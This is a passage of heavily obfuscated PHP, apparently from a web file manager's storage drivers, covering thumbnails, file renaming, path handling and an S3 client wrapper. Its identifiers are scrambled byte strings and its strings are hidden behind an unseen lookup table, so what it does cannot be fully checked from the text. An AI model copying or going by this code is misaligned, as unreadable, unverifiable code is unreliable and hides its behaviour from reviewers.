(!is_null($AŠ¡ì‰Õôò)) { $cæÄ­İ”[$b‹ˆ”Ë•ƒ] = $AŠ¡ì‰Õôò; return; } $D¬™²Ğ¦” = isset($cæÄ­İ”[$b‹ˆ”Ë•ƒ]) ? $cæÄ­İ”[$b‹ˆ”Ë•ƒ] : null; if (!is_null($D¬™²Ğ¦”)) { return $D¬™²Ğ¦”; } goto b²Ò•ô·Œó; a‹ïËàÚëŠ: $d¢„„¾ï  =& $_SERVER[¹…ÕÄ]; static $cæÄ­İ” = array(); $c°ÍñÇÆÄ = $EŒÜ¦ÀÒÀ ? ltrim($this->getPathOuter($EŒÜ¦ÀÒÀ), $d¢„„¾ï [8]) : $EŒÜ¦ÀÒÀ; goto F¿ç‚£©»—; F¿ç‚£©»—: $b‹ˆ”Ë•ƒ = $d¢„„¾ï [159] . $Bá·•Í¾ÉÓ . $d¢„„¾ï [160] . rtrim($c°ÍñÇÆÄ, $d¢„„¾ï [8]); if (is_null($Bá·•Í¾ÉÓ)) { $cæÄ­İ” = array(); return; } if (is_null($EŒÜ¦ÀÒÀ)) { unset($cæÄ­İ”[$b‹ˆ”Ë•ƒ]); return; } goto fËß‘Â¨ç»; b²Ò•ô·Œó: $D¬™²Ğ¦” = $this->{$Bá·•Í¾ÉÓ}($EŒÜ¦ÀÒÀ); $cæÄ­İ”[$b‹ˆ”Ë•ƒ] = $D¬™²Ğ¦”; return $D¬™²Ğ¦”; goto fºÑŒó“÷; fºÑŒó“÷: } public function fileOutImage($bÚ¸†Í¯¥÷, $fƒ¯ÇäÍ® = 250) { goto DÔø²İ÷ê; DÔø²İ÷ê: $eéñƒÖ©â =& $_SERVER[¹…ÕÄ]; if (substr($bÚ¸†Í¯¥÷, 0, 4) == $eéñƒÖ©â[146]) { $this->fileOutLink($bÚ¸†Í¯¥÷); } $e‹¾ã°çß = $this->info($bÚ¸†Í¯¥÷); goto B÷Ã«ÅŠ‚³; eæèÊƒ©: $aÌŠ§ëÉäù = DATA_THUMB . $fÈ°Ø½™¹; del_file($aÌŠ§ëÉäù); if (!@file_exists($aÌŠ§ëÉäù)) { $B‚Òßâ†Û = TEMP_FILES; if (!is_dir($B‚Òßâ†Û)) { mk_dir($B‚Òßâ†Û); } $C¿¥„â¤¿â = $B‚Òßâ†Û . $Dó¯åœÅÑ½ . $eéñƒÖ©â[94] . $e‹¾ã°çß[$eéñƒÖ©â[167]]; if (!@file_exists($C¿¥„â¤¿â)) { $C¿¥„â¤¿â = $this->download($bÚ¸†Í¯¥÷, $C¿¥„â¤¿â); } $aˆ“ğÒÂáÇ = new ImageThumb($C¿¥„â¤¿â, $eéñƒÖ©â[173]); $aˆ“ğÒÂáÇ->prorate($aÌŠ§ëÉäù, $fƒ¯ÇäÍ®, $fƒ¯ÇäÍ® * 10); } goto BĞõÖ˜; B÷Ã«ÅŠ‚³: $eä†í†‰â« = $e‹¾ã°çß[$eéñƒÖ©â[28]]; $Eµ‘Æµ“¿£ = !1; if (isset($GLOBALS[$eéñƒÖ©â[161]]) && $GLOBALS[$eéñƒÖ©â[161]][$eéñƒÖ©â[75]] == $e‹¾ã°çß[$eéñƒÖ©â[75]]) { $C¦£½£Ú¼¶ = $GLOBALS[$eéñƒÖ©â[161]][$eéñƒÖ©â[162]]; if (!$e‹¾ã°çß[$eéñƒÖ©â[163]]) { $e‹¾ã°çß[$eéñƒÖ©â[163]] = $GLOBALS[$eéñƒÖ©â[161]]; } if (isset($C¦£½£Ú¼¶[$eéñƒÖ©â[164]])) { if ($C¦£½£Ú¼¶[$eéñƒÖ©â[164]] <= $fƒ¯ÇäÍ® && $C¦£½£Ú¼¶[$eéñƒÖ©â[165]] <= $fƒ¯ÇäÍ®) { $Eµ‘Æµ“¿£ = !0; } } $eä†í†‰â« = $e‹¾ã°çß[$eéñƒÖ©â[163]][$eéñƒÖ©â[28]]; } goto fğ½‹Œ‡òï; AÑâ¤ƒßÇ›: IO::fileOut($Aß§õÈ¡•¯); goto f†±ø‚¾‰; fğ½‹Œ‡òï: if ($e‹¾ã°çß[$eéñƒÖ©â[77]] <= 1024 * 50 || $Eµ‘Æµ“¿£ || !function_exists($eéñƒÖ©â[166]) || $e‹¾ã°çß[$eéñƒÖ©â[167]] == $eéñƒÖ©â[168]) { return $this->fileOut($bÚ¸†Í¯¥÷, !1, $eä†í†‰â«); } if (isset($e‹¾ã°çß[$eéñƒÖ©â[163]][$eéñƒÖ©â[169]])) { $Dó¯åœÅÑ½ = $e‹¾ã°çß[$eéñƒÖ©â[163]][$eéñƒÖ©â[169]]; } else { if (isset($e‹¾ã°çß[$eéñƒÖ©â[163]][$eéñƒÖ©â[170]])) { $Dó¯åœÅÑ½ = $e‹¾ã°çß[$eéñƒÖ©â[163]][$eéñƒÖ©â[170]]; } else { $Dó¯åœÅÑ½ = md5("{$e‹¾ã°çß[$eéñƒÖ©â[28]]}\137{$e‹¾ã°çß[$eéñƒÖ©â[75]]}\137{$e‹¾ã°çß[$eéñƒÖ©â[77]]}"); } } $fÈ°Ø½™¹ = "{$Dó¯åœÅÑ½}\x5f{$fƒ¯ÇäÍ®}\x2e\x70\156\x67"; goto A“ö¯˜ä; A“ö¯˜ä: if (!($c®ÍÎôÓîØ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $eéñƒÖ©â[171]))) { $DïìÒ„è¼ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $eéñƒÖ©â[172]); } else { $DïìÒ„è¼ = KodIO::make($c®ÍÎôÓîØ); } if ($c®ÍÎôÓîØ = IO::fileNameExist($DïìÒ„è¼, $fÈ°Ø½™¹)) { $aÌŠ§ëÉäù = KodIO::make($c®ÍÎôÓîØ); return IO::fileOut($aÌŠ§ëÉäù, !1, $eä†í†‰â«); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto eæèÊƒ©; BĞõÖ˜: if (!file_exists($aÌŠ§ëÉäù) || filesize($aÌŠ§ëÉäù) < 100) { return @file_exists($C¿¥„â¤¿â) ? IO::fileOut($C¿¥„â¤¿â) : $this->fileOut($bÚ¸†Í¯¥÷); } if (!($Aß§õÈ¡•¯ = IO::move($aÌŠ§ëÉäù, $DïìÒ„è¼))) { return IO::fileOut($aÌŠ§ëÉäù); } del_file($aÌŠ§ëÉäù); goto AÑâ¤ƒßÇ›; f†±ø‚¾‰: } public function fileOutImageServer($A¼ƒìÌ££®, $DÒ‘Õ‹°Â = 250) { $this->fileOutImage($A¼ƒìÌ££®, $DÒ‘Õ‹°Â); } public function fileNameAuto($cå…ÈªÏ, $fã˜ÉÖÚ¸³, $cíà÷µá… = REPEAT_RENAME, $d†¬ Ø·º = false) { goto B‘Â°ù¸Ñ²; E´ ˜îÆÍÓ: while ($this->exist(rtrim($cå…ÈªÏ, $BªÊÄ‚›Êï[8]) . $BªÊÄ‚›Êï[8] . $f¸¶‰™ªõ)) { $f¸¶‰™ªõ = $C ì®ğò® . "\x28{$eÆ¾¥Ìš‰¶}\51{$fÓæºæ¯î}"; $eÆ¾¥Ìš‰¶++; } return $f¸¶‰™ªõ; goto a©ŠÍµöÚ÷; B‘Â°ù¸Ñ²: $BªÊÄ‚›Êï =& $_SERVER[¹…ÕÄ]; $bÂ’£à³«ª = $cå…ÈªÏ === $BªÊÄ‚›Êï[33] ? $fã˜ÉÖÚ¸³ : rtrim($cå…ÈªÏ, $BªÊÄ‚›Êï[8]) . $BªÊÄ‚›Êï[8] . $fã˜ÉÖÚ¸³; if ($cíà÷µá… == REPEAT_REPLACE || !$this->exist($bÂ’£à³«ª) || $d†¬ Ø·º && $cíà÷µá… != REPEAT_RENAME_FOLDER) { return $fã˜ÉÖÚ¸³; } goto CïóÜˆìóÃ; CïóÜˆìóÃ: if ($cíà÷µá… == REPEAT_SKIP) { return !1; } $fÓæºæ¯î = $BªÊÄ‚›Êï[94] . get_path_ext($fã˜ÉÖÚ¸³); $fÓæºæ¯î = $fÓæºæ¯î == $BªÊÄ‚›Êï[94] || $d†¬ Ø·º ? $BªÊÄ‚›Êï[33] : $fÓæºæ¯î; goto D·´å¿Ä ¢; D·´å¿Ä ¢: $eÆ¾¥Ìš‰¶ = 1; $C ì®ğò® = substr($fã˜ÉÖÚ¸³, 0, strlen($fã˜ÉÖÚ¸³) - strlen($fÓæºæ¯î)); $f¸¶‰™ªõ = $C ì®ğò® . "\50{$eÆ¾¥Ìš‰¶}\x29{$fÓæºæ¯î}"; goto E´ ˜îÆÍÓ; a©ŠÍµöÚ÷: } private function fileNameAutoList($EĞ‘çÆïïƒ, $cƒò¼ƒáÃô, $C¨É¥ùñ¨Ò = false) { goto DÅ™ÕÖ‹šÄ; DÅ™ÕÖ‹šÄ: $B‹¾é¯Âå¬ =& $_SERVER[¹…ÕÄ]; $a†»©ëÊ = $this->listPath($EĞ‘çÆïïƒ, !0); $a†»©ëÊ = array_merge($a†»©ëÊ[$B‹¾é¯Âå¬[74]], $a†»©ëÊ[$B‹¾é¯Âå¬[73]]); goto CÙí¶„ğËâ; FÉ¾¦Ñ‘Æ§: return $DÀ‰èÑ±öÉ; goto EÙÍ™†Âó·; CÙí¶„ğËâ: $F”¼®íÓùõ = array_to_keyvalue($a†»©ëÊ, $B‹¾é¯Âå¬[33], $B‹¾é¯Âå¬[28]); $CùŒ£°ô© = $B‹¾é¯Âå¬[94] . get_path_ext($cƒò¼ƒáÃô); $CùŒ£°ô© = $CùŒ£°ô© == $B‹¾é¯Âå¬[94] || $C¨É¥ùñ¨Ò ? $B‹¾é¯Âå¬[33] : $CùŒ£°ô©; goto cÖå‰Ü§Ûî; cÖå‰Ü§Ûî: $cæØ÷ äÁ† = substr($cƒò¼ƒáÃô, 0, strlen($cƒò¼ƒáÃô) - strlen($CùŒ£°ô©)); $DÀ‰èÑ±öÉ = $cæØ÷ äÁ† . "\50\60\x29{$CùŒ£°ô©}"; for ($C¥Ş´çß = 1; $C¥Ş´çß <= count($F”¼®íÓùõ) + 1; $C¥Ş´çß++) { $DÀ‰èÑ±öÉ = $cæØ÷ äÁ† . "\50{$C¥Ş´çß}\x29{$CùŒ£°ô©}"; if (!in_array_not_case($DÀ‰èÑ±öÉ, $F”¼®íÓùõ)) { return $DÀ‰èÑ±öÉ; } } goto FÉ¾¦Ñ‘Æ§; EÙÍ™†Âó·: } public function listAllFiles($Dõ—»®éõ, $dçˆ¹÷Œ•, $dïÛƒ•ëïê = array()) { goto AœöœÏÌì‘; bŸÌœ™Äæ: foreach (array_unique($dêª‘ÂÆß‡) as $FËÌÛÏòÏ¿) { $fš¸‡Ş¥À = array($e¾ÎœÏÀ »[75] => $this->getPathOuter($e¾ÎœÏÀ »[8] . $Dõ—»®éõ . $e¾ÎœÏÀ »[8] . $FËÌÛÏòÏ¿), $e¾ÎœÏÀ »[76] => 1, $e¾ÎœÏÀ »[77] => 0); if (substr($FËÌÛÏòÏ¿, -1) != $e¾ÎœÏÀ »[8]) { $fš¸‡Ş¥À[$e¾ÎœÏÀ »[76]] = 0; $cÂíØ¢“ = $this->getPath($Dõ—»®éõ . $e¾ÎœÏÀ »[8] . $FËÌÛÏòÏ¿); $fš¸‡Ş¥À[$e¾ÎœÏÀ »[77]] = isset($dïÛƒ•ëïê[$cÂíØ¢“]) ? $dïÛƒ•ëïê[$cÂíØ¢“] : $this->size($cÂíØ¢“); } $dë…˜½±¢[] = $fš¸‡Ş¥À; } return $dë…˜½±¢; goto f‚İï‡Ííƒ; DÏê¸å–¬À: $Dõ—»®éõ = trim($Dõ—»®éõ, $e¾ÎœÏÀ »[8]); foreach ($dçˆ¹÷Œ• as $FËÌÛÏòÏ¿) { $b”½¤š…„ì = ltrim(substr(trim($FËÌÛÏòÏ¿, $e¾ÎœÏÀ »[8]), strlen($Dõ—»®éõ)), $e¾ÎœÏÀ »[8]); $dêª‘ÂÆß‡ = array_merge($dêª‘ÂÆß‡, $this->slicePath($b”½¤š…„ì)); } $dë…˜½±¢ = array(); goto bŸÌœ™Äæ; AœöœÏÌì‘: $e¾ÎœÏÀ » =& $_SERVER[¹…ÕÄ]; if (empty($dçˆ¹÷Œ•)) { return array(); } $dêª‘ÂÆß‡ = array(); goto DÏê¸å–¬À; f‚İï‡Ííƒ: } public function slicePath($B’é°‹¦•) { $FŞ‹ø‰¬×ˆ =& $_SERVER[¹…ÕÄ]; $BÛç™¤‚Ø = explode($FŞ‹ø‰¬×ˆ[8], trim($B’é°‹¦•, $FŞ‹ø‰¬×ˆ[8])); $FãâåóÔË¯ = 0; do { ++$FãâåóÔË¯; $a˜…êºª“¼[] = implode($FŞ‹ø‰¬×ˆ[8], array_slice($BÛç™¤‚Ø, 0, $FãâåóÔË¯)) . $FŞ‹ø‰¬×ˆ[8]; } while ($FãâåóÔË¯ < count($BÛç™¤‚Ø)); $a˜…êºª“¼[count($BÛç™¤‚Ø) - 1] = $B’é°‹¦•; return $a˜…êºª“¼; } public function getHost() { $C—ò«å¿ø =& $_SERVER[¹…ÕÄ]; $añØÓ‡‚Ã = parse_url(trim($this->domain, $C—ò«å¿ø[8])); $a™¾«ŒÜˆ = isset($añØÓ‡‚Ã[$C—ò«å¿ø[174]]) ? $añØÓ‡‚Ã[$C—ò«å¿ø[174]] : http_type(); $d±ÙÖôÆĞ” = isset($añØÓ‡‚Ã[$C—ò«å¿ø[175]]) ? $añØÓ‡‚Ã[$C—ò«å¿ø[175]] : $añØÓ‡‚Ã[$C—ò«å¿ø[75]]; if (isset($añØÓ‡‚Ã[$C—ò«å¿ø[176]])) { $d±ÙÖôÆĞ” .= $C—ò«å¿ø[4] . $añØÓ‡‚Ã[$C—ò«å¿ø[176]]; } return $a™¾«ŒÜˆ . $C—ò«å¿ø[177] . $d±ÙÖôÆĞ”; } public function pathEncode($bØó›Á”è) { $b’Àëè±Í =& $_SERVER[¹…ÕÄ]; return str_replace($b’Àëè±Í[178], $b’Àëè±Í[8], rawurlencode($bØó›Á”è)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($f½Ìˆæğ¡) { set_timeout(); require_once SDK_DIR . $_SERVER[¹…ÕÄ][179]; parent::__construct(); $this->_init($f½Ìˆæğ¡); } public function _init($cí²ª¸¿­) { foreach ($cí²ª¸¿­ as $eõÕÉÌ˜òî => $eè³á™ÆÓÇ) { if (isset($this->{$eõÕÉÌ˜òî})) { $this->{$eõÕÉÌ˜òî} = $eè³á™ÆÓÇ; } } $this->endpoint = $cí²ª¸¿­[$_SERVER[¹…ÕÄ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($a¾î½‘­‡ˆ = "\x76\64") { $this->signVer = $a¾î½‘­‡ˆ; $this->client->setSignatureVersion($a¾î½‘­‡ˆ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto A¶ÙÜ—Ì»Õ; A¶ÙÜ—Ì»Õ: $aè‘Ø–Ì«¼ =& $_SERVER[¹…ÕÄ]; $e¾âº½Ì® = $this->getBucketCors(); if (!$e¾âº½Ì® || !is_array($e¾âº½Ì®)) { return !1; } goto fä÷‡èíÈ¼; BÄÂ¾Ã¶©: $C†çÀ‘àÉ» = array($aè‘Ø–Ì«¼[186], $aè‘Ø–Ì«¼[187], $aè‘Ø–Ì«¼[188], $aè‘Ø–Ì«¼[189], $aè‘Ø–Ì«¼[190]); $D—²êœ†Ùİ = array_diff($C†çÀ‘àÉ», $Fã´‰­Í™Û); return empty($D—²êœ†Ùİ); goto A·ØÇØçî; fä÷‡èíÈ¼: if ($e¾âº½Ì®[$aè‘Ø–Ì«¼[181]] != $aè‘Ø–Ì«¼[182] || $e¾âº½Ì®[$aè‘Ø–Ì«¼[183]] != $aè‘Ø–Ì«¼[182]) { return !1; } $Fã´‰­Í™Û = array_map($aè‘Ø–Ì«¼[184], $e¾âº½Ì®[$aè‘Ø–Ì«¼[185]]); if (!is_array($Fã´‰­Í™Û)) { $Fã´‰­Í™Û = array(); } goto BÄÂ¾Ã¶©; A·ØÇØçî: } public function mkfile($cî¡•›Ñ, $D×ÍÙÖˆ¤ = '', $B¢ÎÈÛò¦­ = REPEAT_RENAME) { $e¾•Ãö’Ø = $this->setContent($cî¡•›Ñ, $D×ÍÙÖˆ¤); if ($e¾•Ãö’Ø !== !1) { return $this->getPathOuter($cî¡•›Ñ); } return !1; } public function mkdir($F¸ÙµÎÌ”‡, $AÕÊ–±×Ì = REPEAT_SKIP) { if (empty($F¸ÙµÎÌ”‡)) { return !1; } if ($this->_isFolder($F¸ÙµÎÌ”‡)) { return $this->getPathOuter($F¸ÙµÎÌ”‡); } $FôÃ¥ÚñÓà = $this->setContent($F¸ÙµÎÌ”‡, $_SERVER[¹…ÕÄ][33], !0); if ($FôÃ¥ÚñÓà !== !1) { return $this->getPathOuter($F¸ÙµÎÌ”‡); } return !1; } public function copyFile($d”¬Èïœº, $B³îŒŒ†½–, $E®ˆÚİÉ†• = array()) { $DìÜÒÔäÒâ =& $_SERVER[¹…ÕÄ]; $cªÙ½º‹‚Ì = $this->objectMeta($d”¬Èïœº); if (!$cªÙ½º‹‚Ì) { return !1; } if ($cªÙ½º‹‚Ì[$DìÜÒÔäÒâ[77]] <= 1024 * 1024 * 200) { $e±£šäÛñà = $this->client->copyObject($this->bucket, $d”¬Èïœº, $this->bucket, $B³îŒŒ†½–, $DìÜÒÔäÒâ[191], $E®ˆÚİÉ†•); } else { $e±£šäÛñà = $this->client->multiCopyObject($this->bucket, $d”¬Èïœº, $this->bucket, $B³îŒŒ†½–, $E®ˆÚİÉ†•); } $e±£šäÛñà = $e±£šäÛñà ? $this->getPathOuter($B³îŒŒ†½–) : !1; return $e±£šäÛñà; } public function moveFile($bóŒØ¬—„Å, $bÊø‹òÈ²) { if ($this->copyFile($bóŒØ¬—„Å, $bÊø‹òÈ²)) { $this->delFile($bóŒØ¬—„Å); return $this->getPathOuter($bÊø‹òÈ²); } return !1; } public function delFile($aë¦›àèŒ¸) { return $this->client->deleteObject($this->bucket, $aë¦›àèŒ¸); } public function delFolder($e›ŠŠÇÉõ¸) { goto e·Â¤—êò; E¿ İ‰¿•: if (!empty($e›ŠŠÇÉõ¸) && !in_array($EÔ°›ÆÃ¦×, $CÄ—£šğ[$Bï£ ‘«ßÎ[74]])) { $CÄ—£šğ[$Bï£ ‘«ßÎ[74]][] = $EÔ°›ÆÃ¦×; } $eÚÆ…½Óá = $this->delByBatch($CÄ—£šğ[$Bï£ ‘«ßÎ[73]]); if (!$eÚÆ…½Óá) { return !1; } goto Fãôæø¢ôÑ; EÁËï£Â£ï: $CÄ—£šğ = $this->fileList($e›ŠŠÇÉõ¸); $this->listItemCache = !0; $EÔ°›ÆÃ¦× = trim($e›ŠŠÇÉõ¸, $Bï£ ‘«ßÎ[8]) . $Bï£ ‘«ßÎ[8]; goto E¿ İ‰¿•; Fãôæø¢ôÑ: return $this->delByBatch($CÄ—£šğ[$Bï£ ‘«ßÎ[74]]); goto Bä¦š ÙãÈ; e·Â¤—êò: $Bï£ ‘«ßÎ =& $_SERVER[¹…ÕÄ]; if (!$this->exist($e›ŠŠÇÉõ¸)) { return !0; } $this->listItemCache = !1; goto EÁËï£Â£ï; Bä¦š ÙãÈ: } private function delByBatch($F °õë‘„¸) { foreach (array_chunk($F °õë‘„¸, 1000) as $Aª³¯¥ ) { $DŒ÷—Øï… = $this->client->deleteObjects($this->bucket, $Aª³¯¥ ); if (!$DŒ÷—Øï…) { return !1; } } return !0; } public function rename($fñ¡ºâÛÆ, $eÂÍÍ‚Õ•Ø) { return $this->renameObject($fñ¡ºâÛÆ, $eÂÍÍ‚Õ•Ø); } public function listPath($D„´ŸŠ†ñ, $Aö‰„³©Š¤ = false) { $A¥ôàÌùóĞ =& $_SERVER[¹…ÕÄ]; $EÑ±°êªÆ = $this->fileList($D„´ŸŠ†ñ, $A¥ôàÌùóĞ[8], !0); foreach ($EÑ±°êªÆ[$A¥ôàÌùóĞ[74]] as $EŠ²Œ®—­ => $BÙ‘ù±äŠ) { $EÑ±°êªÆ[$A¥ôàÌùóĞ[74]][$EŠ²Œ®—­] = $this->folderInfo($BÙ‘ù±äŠ, $Aö‰„³©Š¤); } foreach ($EÑ±°êªÆ[$A¥ôàÌùóĞ[73]] as $EŠ²Œ®—­ => $BÙ‘ù±äŠ) { $EÑ±°êªÆ[$A¥ôàÌùóĞ[73]][$EŠ²Œ®—­] = $this->fileInfo($BÙ‘ù±äŠ[$A¥ôàÌùóĞ[28]], $Aö‰„³©Š¤, $BÙ‘ù±äŠ); } return $EÑ±°êªÆ; } private function fileInfo($a¥ğ‘¢‚‘, $a™„ìÓºÌƒ = false, $e¬ÇÊ§ÂÁ = array()) { goto BÊÀ¾¯ôŸ; AÇ¬Áä”˜Â: $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[192]] = $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[83]] = 0; $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[193]] = $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[194]] = !0; if (empty($e¬ÇÊ§ÂÁ)) { $e¬ÇÊ§ÂÁ = $this->objectMeta($a¥ğ‘¢‚‘); if (!$e¬ÇÊ§ÂÁ) { return $eÁ®‡Ç­õŒ; } } goto b´Á®ËŞŠ­; b´Á®ËŞŠ­: if (isset($e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[195]])) { $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[83]] = $e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[195]]; } if (isset($e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[77]])) { $eÁ®‡Ç­õŒ[$c††ƒÎİÆÀ[77]] = $e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[77]]; } return $eÁ®‡Ç­õŒ; goto b¶÷ ¥ê»¿; BÊÀ¾¯ôŸ: $c††ƒÎİÆÀ =& $_SERVER[¹…ÕÄ]; $eÁ®‡Ç­õŒ = array($c††ƒÎİÆÀ[28] => $this->pathThis($a¥ğ‘¢‚‘), $c††ƒÎİÆÀ[75] => $this->getPathOuter($a¥ğ‘¢‚‘), $c††ƒÎİÆÀ[29] => $c††ƒÎİÆÀ[173], $c††ƒÎİÆÀ[167] => $this->ext($a¥ğ‘¢‚‘), $c††ƒÎİÆÀ[77] => isset($e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[77]]) ? $e¬ÇÊ§ÂÁ[$c††ƒÎİÆÀ[77]] : 0); if ($a™„ìÓºÌƒ) { return $eÁ®‡Ç­õŒ; } goto AÇ¬Áä”˜Â; b¶÷ ¥ê»¿: } private function folderInfo($b´¿»Ù’…†, $E¤–ÕŒ²°Ë = false) { goto Dé¬İãŠ’¦; d·…–•«ß´: return $B‹ïáÜì´¤; goto cĞÅùóŒ¦¢; eŠ­¿…„¢: $B‹ïáÜì´¤[$e²ÑšéÆëö[192]] = $B‹ïáÜì´¤[$e²ÑšéÆëö[83]] = 0; $B‹ïáÜì´¤[$e²ÑšéÆëö[193]] = $B‹ïáÜì´¤[$e²ÑšéÆëö[194]] = !0; if ($b´¿»Ù’…† == $e²ÑšéÆëö[33]) { return $B‹ïáÜì´¤; } goto F³Áº¼Èå; Dé¬İãŠ’¦: $e²ÑšéÆëö =& $_SERVER[¹…ÕÄ]; $B‹ïáÜì´¤ = array($e²ÑšéÆëö[28] => $this->pathThis($b´¿»Ù’…†), $e²ÑšéÆëö[75] => $this->getPathOuter($e²ÑšéÆëö[8] . $b´¿»Ù’…†), $e²ÑšéÆëö[29] => $e²ÑšéÆëö[76]); if ($E¤–ÕŒ²°Ë) { return $B‹ïáÜì´¤; } goto eŠ­¿…„¢; F³Áº¼Èå: $b´¿»Ù’…† = trim($b´¿»Ù’…†, $e²ÑšéÆëö[8]) . $e²ÑšéÆëö[8]; $B»ù˜÷áå = $this->objectMeta($b´¿»Ù’…†); if (isset($B»ù˜÷áå[$e²ÑšéÆëö[195]])) { $B‹ïáÜì´¤[$e²ÑšéÆëö[192]] = $B»ù˜÷áå[$e²ÑšéÆëö[195]]; } goto d·…–•«ß´; cĞÅùóŒ¦¢: } private function fileList($f¶ˆ¯Ò©ÅÌ, $B™ô“òƒº´ = '', $A¬ùÊ±Äœ¯ = 0) { goto FÄã–†»£; FÄã–†»£: $e…›ùãÁ× =& $_SERVER[¹…ÕÄ]; $cç‹®»ÁÓ = rtrim($f¶ˆ¯Ò©ÅÌ, $e…›ùãÁ×[8]) . $e…›ùãÁ×[8]; $CÏÍĞ´ˆŞ± = $this->listObjs($cç‹®»ÁÓ, null, null, $B™ô“òƒº´); goto aÅìÇÙÏ¡¸; aÅìÇÙÏ¡¸: if (!$CÏÍĞ´ˆŞ±) { return array($e…›ùãÁ×[74] => array(), $e…›ùãÁ×[73] => array()); } $Céğ¦…ˆÚ = $this->listItemCache === !1 ? !1 : !0; $E½ğËİá÷ = $F¨”õåÂ„Š = array(); goto Aºö‘òö¸; BŒ¯ìŠäàÓ: return array($e…›ùãÁ×[74] => $E½ğËİá÷, $e…›ùãÁ×[73] => $F¨”õåÂ„Š); goto C”Õ×‘°âï; Aºö‘òö¸: foreach ($CÏÍĞ´ˆŞ±[$e…›ùãÁ×[196]] as $eÄö¯¹¿àÓ) { goto cïÜàè¬ˆ¿; eìŸÛ¦¤ : $cÕƒ×Â™¬ = $bñ†Ë”È == 0 && substr($FªÎˆ­¾·«, strlen($FªÎˆ­¾·«) - 1, 1) == $e…›ùãÁ×[8] ? !0 : !1; if ($Céğ¦…ˆÚ) { $this->cacheMethod($e…›ùãÁ×[197], $FªÎˆ­¾·«, $cÕƒ×Â™¬); $this->cacheMethod($e…›ùãÁ×[198], $FªÎˆ­¾·«, $eÄö¯¹¿àÓ); } if ($cÕƒ×Â™¬) { $E½ğËİá÷[] = $FªÎˆ­¾·«; continue; } goto b››©„ÓÒ˜; cïÜàè¬ˆ¿: $FªÎˆ­¾·« = $eÄö¯¹¿àÓ[$e…›ùãÁ×[28]]; if ($FªÎˆ­¾·« == $cç‹®»ÁÓ) { continue; } $bñ†Ë”È = isset($eÄö¯¹¿àÓ[$e…›ùãÁ×[77]]) ? $eÄö¯¹¿àÓ[$e…›ùãÁ×[77]] : 0; goto eìŸÛ¦¤ ; b››©„ÓÒ˜: $F¨”õåÂ„Š[] = $A¬ùÊ±Äœ¯ ? $eÄö¯¹¿àÓ : $FªÎˆ­¾·«; goto CƒÙëºÆÔ; CƒÙëºÆÔ: } foreach ($CÏÍĞ´ˆŞ±[$e…›ùãÁ×[199]] as $eÄö¯¹¿àÓ) { $E½ğËİá÷[] = $eÄö¯¹¿àÓ[$e…›ùãÁ×[28]]; if ($Céğ¦…ˆÚ) { $this->cacheMethod($e…›ùãÁ×[197], $eÄö¯¹¿àÓ[$e…›ùãÁ×[28]], !0); } } if ($Céğ¦…ˆÚ) { $this->cacheMethod($e…›ùãÁ×[197], $f¶ˆ¯Ò©ÅÌ, !0); } goto BŒ¯ìŠäàÓ; C”Õ×‘°âï: } private function listObjs($D½Áƒè‹îç, $A¶âøŞª = null, $Dˆ¦¸†¸ƒá = null, $e…ÃîâÂŠ” = null) { $c·££¨ò¼ =& $_SERVER[¹…ÕÄ]; $D½Áƒè‹îç = trim($D½Áƒè‹îç, $c·££¨ò¼[8]); $c¼®‰åØ¿— = empty($D½Áƒè‹îç) ? $c·££¨ò¼[33] : $D½Áƒè‹îç . $c·££¨ò¼[8]; return $this->client->getBucket($this->bucket, $c¼®‰åØ¿—, $A¶âøŞª, $Dˆ¦¸†¸ƒá, $e…ÃîâÂŠ”, !0); } public function has($D¶»µ¬¾ÂÆ, $Fç‚ö¥‰ªè = false, $còÌÛŠ§–å = true) { goto CâÔ±¬ß•; CâÔ±¬ß•: $A£„‚„¨óò =& $_SERVER[¹…ÕÄ]; $D¶»µ¬¾ÂÆ = trim($D¶»µ¬¾ÂÆ, $A£„‚„¨óò[8]); $aë…ÕÅ‚ = empty($D¶»µ¬¾ÂÆ) ? $A£„‚„¨óò[33] : $D¶»µ¬¾ÂÆ . $A£„‚„¨óò[8]; goto FƒùœÓãà§; FƒùœÓãà§: $AÑµ¨¤¿Œ‚ = null; $báÏ¢©®ÏŒ = 500; $fñ¾¸ÀÆà¸ = $A£„‚„¨óò[8]; goto C–Ğ¾å´¦; fÓ­İÓÔñ: return !1; goto bâ”›ØÉÊ†; C–Ğ¾å´¦: $CÜµ­Î¨¤£ = $D·¢ÛÈäòä = array(); while (!0) { $däñì® †– = $this->listObjs($D¶»µ¬¾ÂÆ, $AÑµ¨¤¿Œ‚, $báÏ¢©®ÏŒ, $fñ¾¸ÀÆà¸); if (!$däñì® †–) { break; } $AÑµ¨¤¿Œ‚ = $däñì® †–[$A£„‚„¨óò[200]]; $cÃ¬•„‡«Ÿ = $däñì® †–[$A£„‚„¨óò[196]]; $b¦¤Ùöí‚ = $däñì® †–[$A£„‚„¨óò[199]]; if (empty($cÃ¬•„‡«Ÿ) && empty($b¦¤Ùöí‚)) { break; } if (count($cÃ¬•„‡«Ÿ) == 1 && $cÃ¬•„‡«Ÿ[0][$A£„‚„¨óò[28]] == $aë…ÕÅ‚) { break; } if ($Fç‚ö¥‰ªè) { if (count($cÃ¬•„‡«Ÿ)) { $cÃ¬•„‡«Ÿ = array_column($cÃ¬•„‡«Ÿ, $A£„‚„¨óò[28]); $CÜµ­Î¨¤£ = 